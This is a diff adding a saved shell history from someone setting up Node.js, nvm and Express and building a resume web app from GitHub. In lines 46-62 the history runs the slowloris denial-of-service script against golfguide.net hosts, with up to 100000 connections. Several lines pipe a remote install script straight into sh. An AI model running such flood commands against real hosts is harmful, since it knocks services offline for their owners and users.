@@ -1,0 +1,229 @@
+    1  curl https://raw.github.com/creationix/nvm/master/install.sh | sh
+    2  nvm
+    3  logout
+    4  nvm
+    5  curl https://raw.github.com/creationix/nvm/master/install.sh | sh
+    6  nvm
+    7  logout
+    8  apt-get install nvm
+    9  sudo apt-get install nvm
+   10  sudo curl https://raw.github.com/creationix/nvm/master/install.sh | sh
+   11  ls
+   12  git clone https://github.com/creationix/nvm.git
+   13  cd nvm/
+   14  ls
+   15  ./install.sh 
+   16  nvm install node
+   17  logout
+   18  nvm install node
+   19  ls
+   20  rm -rf smithdev/
+   21  npm install -g express
+   22  mkdir smithdev.io
+   23  cd smithdev.io/
+   24  express
+   25  npm install -g express
+   26  express
+   27  logout
+   28  cd smithdev.io/
+   29  express
+   30  sudo sudo npm install -g express-generator
+   31  express
+   32  npm install
+   33  sudo npm install
+   34  ls
+   35  npm start
+   36  sudo npm install
+   37  npm start
+   38  ls
+   39  rm -rf *
+   40  sudo rm -rf *
+   41  ls
+   42  express
+   43  sudo npm install
+   44  npm start
+   45  ls
+   46  cd slowloris.pl/
+   47  ls
+   48  perl slowloris.pl api.golfguide.net -num 1000
+   49  perl slowloris.pl -dns api.golfguide.net -num 1000
+   50  perl slowloris.pl -dns api.golfguide.net -num 5000
+   51  perl slowloris.pl -dns dev.golfguide.net -num 5000
+   52  perl slowloris.pl -dns dev.golfguide.net -num 10000
+   53  perl slowloris.pl -dns dev.golfguide.net -num 10000 -port 80
+   54  perl slowloris.pl -dns dev.golfguide.net -num 100000 -port 80
+   55  perl slowloris.pl -dns dev.golfguide.net -num 50000 -port 80
+   56  perl slowloris.pl -dns dev.golfguide.net -num 40000 -port 80
+   57  perl slowloris.pl -dns dev.golfguide.net -num 30000 -port 80
+   58  perl slowloris.pl -dns dev.golfguide.net -num 20000 -port 80
+   59  perl slowloris.pl -dns dev.golfguide.net -num 10000 -port 80
+   60  perl slowloris.pl -dns api.golfguide.net -num 10000 -port 80
+   61  perl slowloris.pl -dns dev1.golfguide.com -num 10000 -port 80
+   62  perl slowloris.pl -dns dev1.golfguide.net -num 10000 -port 80
+   63  git clone https://github.com/mhaderman/ResumeWebApp.git
+   64  cd ResumeWebApp/
+   65  cd ..
+   66  rm -rf ResumeWebApp/
+   67  git clone https://github.com/VivaLaPanda/ResumeWebApp.git
+   68  cd ResumeWebApp/
+   69  npm update
+   70  ls
+   71  cd model/
+   72  ls
+   73  mv db_connection.example.js db_connection.js
+   74  ls
+   75  vi db_connection.js 
+   76  cd ..
+   77  npm start
+   78  ls
+   79  cd bin/
+   80  ls
+   81  vi www 
+   82  npm start
+   83  ls
+   84  vi www 
+   85  npm start
+   86  ls
+   87  cd ..
+   88  cd views/
+   89  ls
+   90  sed -i -r 's/school/account/g' `cp -r school account`
+   91  sed -i -r 's/school/account/g' $(cp -r school account)
+   92  ls
+   93  sed -i -r 's/school/account/g' account/
+   94  find account/ -type f -print0 | xargs -0 sed -i 's/school/account/g'
+   95  cp -r school/ resume
+   96  find resume/ -type f -print0 | xargs -0 sed -i 's/school/resume/g'
+   97  cp -r school/ company
+   98  find company/ -type f -print0 | xargs -0 sed -i 's/school/company/g'
+   99  cp -r school/ address
+  100  find address/ -type f -print0 | xargs -0 sed -i 's/school/address/g'
+  101  cp -r school/ skill
+  102  find skill/ -type f -print0 | xargs -0 sed -i 's/school/skill/g'
+  103  npm startr
+  104  npm start
+  105  ls
+  106  find account/ -type f -print0 | xargs -0 sed -i 's/Schools/Skills/g'
+  107  find account/ -type f -print0 | xargs -0 sed -i 's/Skills/Accounts/g'
+  108  find address/ -type f -print0 | xargs -0 sed -i 's/Schools/Addresses/g'
+  109  find company/ -type f -print0 | xargs -0 sed -i 's/Schools/Companies/g'
+  110  find resume/ -type f -print0 | xargs -0 sed -i 's/Schools/Resumes/g'
+  111  find skill/ -type f -print0 | xargs -0 sed -i 's/Schools/Skills/g'
+  112  npm start
+  113  git add *
+  114  git commit
+  115  git config --global user.email "adrian@smithdev.io"
+  116  git config --global user.name "Adrian Smith"
+  117  git commit
+  118  git push origin master
+  119  git add -A
+  120  git commit
+  121  git push origin master
+  122  npm start
+  123  git add -A
+  124  git commit
+  125  git push origin master
+  126  npm start
+  127  ls
+  128  cd ResumeWebApp/
+  129  ls
+  130  node app.js 
+  131  npm app.js 
+  132  node start
+  133  node start app.js 
+  134  ls
+  135  node app.js 
+  136  node stopall
+  137  killall node
+  138  nod
+  139  \
+  140  ls
+  141  node bin/www 
+  142  ls
+  143  cd ResumeWebApp/
+  144  ls
+  145  node bin/www 
+  146  gtit
+  147  git
+  148  git branch
+  149  git clone https://github.com/mhaderman/ResumeWebApp.git
+  150  ks
+  151  ls
+  152  cd ..
+  153  rm -rf ResumeWebApp/
+  154  ls
+  155  git clone https://github.com/mhaderman/ResumeWebApp.git
+  156  ls
+  157  git branch
+  158  ls
+  159  cd ResumeWebApp/
+  160  git branch
+  161  git fetch upstream
+  162  git fetch origin master:master 
+  163  ls
+  164  git branchb
+  165  git branch
+  166  cd ..
+  167  ls
+  168  rm -rf ResumeWebApp/
+  169  git clone https://github.com/VivaLaPanda/ResumeWebApp.git
+  170  ls
+  171  cd ResumeWebApp/
+  172  node bin/www 
+  173  npm install
+  174  node bin/www 
+  175  ;s
+  176  ls
+  177  cd ..
+  178  ls
+  179  cd ResumeWebApp/
+  180  ls
+  181  cd routes/
+  182  ls
+  183  cd ..
+  184  cd..
+  185  cd ..
+  186  ls
+  187  rm -rf ResumeWebApp/
+  188  git clone 
+  189  git clone https://github.com/VivaLaPanda/ResumeWebApp.git
+  190  cd ResumeWebApp/
+  191  git checkout lab10 
+  192  ls
+  193  cd routes/
+  194  ls
+  195  cp school_routes.js account_routes.js
+  196  cp school_routes.js resume_routes.js
+  197  cp school_routes.js company_routes.js
+  198  cp school_routes.js address_routes.js
+  199  cp school_routes.js skill_routes.js
+  200  cd ..
+  201  ls
+  202  cd model/
+  203  ls
+  204  cd ../routes/
+  205  rm account_routes.js 
+  206  rm resume_routes.js 
+  207  rm company_routes.js 
+  208  rm address_routes.js 
+  209  rm skill_routes.js 
+  210  ls
+  211  cd ..
+  212  ls
+  213  node bin/www 
+  214  node install
+  215  npm install
+  216  node bin/www 
+  217  node bin/www
+  218  ls
+  219  cd routes/
+  220  ls
+  221  cp school_routes.js account_routes.js
+  222  cp school_routes.js resume_routes.js
+  223  cp school_routes.js company_routes.js
+  224  cp school_routes.js address_routes.js
+  225  cp school_routes.js skill_routes.js
+  226  history
+  227  cd ..
+  228  ls
+  229  history > commands.txt
